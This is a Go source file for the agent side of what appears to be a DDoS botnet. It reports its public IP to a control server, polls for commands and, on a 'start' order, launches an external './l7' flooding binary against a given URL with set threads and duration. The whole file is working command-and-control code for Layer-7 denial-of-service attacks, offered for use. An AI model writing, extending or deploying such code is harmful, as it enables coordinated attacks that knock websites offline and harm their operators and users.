package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

type Command struct {
	Action     string `json:"action"` // "start", "stop", "none"
	URL        string `json:"url"`
	Threads    int    `json:"threads"`
	Timer      int    `json:"timer"`
	CustomHost string `json:"custom_host"`
}

var (
	mu             sync.Mutex
	currentCommand *exec.Cmd
	status         = "Ready"
)

// reportStatus sends the agent’s current status ("Ready", "Sending", or "Error")
// up to the control server.
func reportStatus(controlURL, agentID string) {
	mu.Lock()
	payload := map[string]string{
		"agentID": agentID,
		"status":  status,
	}
	mu.Unlock()

	data, _ := json.Marshal(payload)
	_, err := http.Post(controlURL+"/agent-status", "application/json", bytes.NewBuffer(data))
	if err != nil {
		fmt.Printf("[AGENT] Failed to POST status: %v\n", err)
		return
	}
}

// executeL7 runs the external "./l7" binary. It updates `status` to "Sending",
// reports that status, sleeps for `timer` seconds, then kills the process,
// flips `status` to "Ready", and reports again.
func executeL7(controlURL, agentID, url string, threads, timer int, customHost string) {
	mu.Lock()
	if currentCommand != nil && currentCommand.Process != nil {
		currentCommand.Process.Kill()
		currentCommand = nil
	}
	status = "Sending"
	mu.Unlock()

	reportStatus(controlURL, agentID)

	args := []string{url, fmt.Sprintf("%d", threads), fmt.Sprintf("%d", timer)}
	if customHost != "" {
		args = append(args, customHost)
	}
	cmd := exec.Command("./l7", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Start(); err != nil {
		fmt.Printf("[AGENT] Failed to start L7: %v\n", err)
		mu.Lock()
		status = "Error"
		mu.Unlock()
		reportStatus(controlURL, agentID)
		return
	}
	mu.Lock()
	currentCommand = cmd
	mu.Unlock()

	go func() {
		time.Sleep(time.Duration(timer) * time.Second)
		mu.Lock()
		if currentCommand != nil && currentCommand.Process != nil {
			currentCommand.Process.Kill()
			currentCommand = nil
		}
		status = "Ready"
		mu.Unlock()
		reportStatus(controlURL, agentID)
	}()
}

// pollControlServer continuously polls /poll-agent?agentID=<agentID> on the control server.
// Depending on the returned Command.Action, it either starts executeL7, kills an existing L7,
// or simply reports its current status as a heartbeat.
func pollControlServer(controlURL, agentID string) {
	for {
		pollURL := fmt.Sprintf("%s/poll-agent?agentID=%s", controlURL, agentID)
		resp, err := http.Get(pollURL)
		if err != nil {
			fmt.Printf("[AGENT] Error polling control server: %v\n", err)
			time.Sleep(5 * time.Second)
			continue
		}
		bodyBytes, _ := ioutil.ReadAll(resp.Body)
		resp.Body.Close()

		var cmd Command
		if err := json.Unmarshal(bodyBytes, &cmd); err != nil {
			fmt.Printf("[AGENT] Invalid JSON from control server: %v\n", err)
			time.Sleep(5 * time.Second)
			continue
		}

		switch cmd.Action {
		case "start":
			fmt.Printf("[AGENT] Received START: %+v\n", cmd)
			go executeL7(controlURL, agentID, cmd.URL, cmd.Threads, cmd.Timer, cmd.CustomHost)

		case "stop":
			fmt.Printf("[AGENT] Received STOP\n")
			mu.Lock()
			if currentCommand != nil && currentCommand.Process != nil {
				currentCommand.Process.Kill()
				currentCommand = nil
			}
			status = "Ready"
			mu.Unlock()
			reportStatus(controlURL, agentID)

		case "none":
			// No new command → send a heartbeat of our current status ("Ready" or "Sending")
			reportStatus(controlURL, agentID)

		default:
			// Unknown action → ignore
		}

		time.Sleep(1 * time.Second)
	}
}

// getPublicIP queries a public IP‐lookup service (like api.ipify.org) and returns
// the agent’s external IP address as a string.
func getPublicIP() (string, error) {
	const ipService = "https://api.ipify.org?format=text"
	resp, err := http.Get(ipService)
	if err != nil {
		return "", fmt.Errorf("failed to fetch public IP: %w", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read IP response: %w", err)
	}

	ip := strings.TrimSpace(string(body))
	if ip == "" {
		return "", fmt.Errorf("empty IP returned from %s", ipService)
	}
	return ip, nil
}

func main() {
	// 1) Get the agent’s public IP address:
	ip, err := getPublicIP()
	if err != nil {
		fmt.Printf("[AGENT] Could not determine public IP: %v\n", err)
		os.Exit(1)
	}
	agentID := ip

	controlServerURL := "http://localhost:8080"
	fmt.Printf("[AGENT] %s starting; polling %s\n", agentID, controlServerURL)

	// 2) Let the control server know we exist (initial “Ready”):
	reportStatus(controlServerURL, agentID)

	// 3) Begin polling for commands:
	pollControlServer(controlServerURL, agentID)
}
